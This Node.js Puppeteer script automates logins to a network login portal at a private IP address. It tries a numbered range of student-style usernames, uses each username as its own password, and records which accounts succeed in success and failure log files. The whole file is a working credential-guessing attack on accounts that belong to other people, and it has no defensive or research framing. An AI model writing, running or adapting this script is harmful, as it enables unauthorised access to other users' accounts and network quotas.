const puppeteer = require("puppeteer");
const fs = require("fs");

function zeroPad(num) {
  return num.toString().padStart(3, "0");
}

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  var pre = "16BCON";
  for (let index = 648; index < 700; index++) {
    var a = pre + zeroPad(index),
      b = pre + zeroPad(index);

    await page.goto("http://172.16.100.2:8090");
    await page.evaluate(
      (a, b) => {
        document.querySelector("#usernametxt > td > input").value = a;
        document.querySelector(
          "body > form > div.maindiv > div.datablock > div.tablecss > table > tbody > tr:nth-child(4) > td > input"
        ).value = b;
        document.querySelector("#logincaption").click();
      },
      a,
      b
    );

    await page
      .waitForSelector("#msgDiv > font > xmp")
      .then(async function(data) {
        //const data1 = await (await elements[i].getProperty('value')).jsonValue();
        const text = await (await data.getProperty("textContent")).jsonValue();
        console.log(text);
        if (
          text ==
          "Your data transfer has been exceeded, Please contact the administrator"
        ) {
          let text = a + " is Success, data exceeded \n";

          console.log(
            a + " is Success, data exceeded" + "%c Oh my heavens! ",
            "background: #222; color: #bada55"
          );
          fs.appendFileSync("./log/"+pre+"/result.txt", text);
          fs.appendFileSync("./log/"+pre+"/success.txt", text);
        } else if (
          text ==
          "The system could not log you on. Make sure your password is correct"
        ) {
          let text = a + " is Failure \n";
          console.error(text);
          fs.appendFileSync("./log/"+pre+"/result.txt", text);
          fs.appendFileSync("./log/"+pre+"/failure.txt", text);
        } else {
          let text = a + " is Success \n";

          fs.appendFileSync("./log/"+pre+"/result.txt", text);
          fs.appendFileSync("./log/"+pre+"/success.txt", text);
        }
      });

    /*     await page.screenshot({ path: "sc" + "+pre+" + ".png" }); */
  }

  await browser.close();
})();
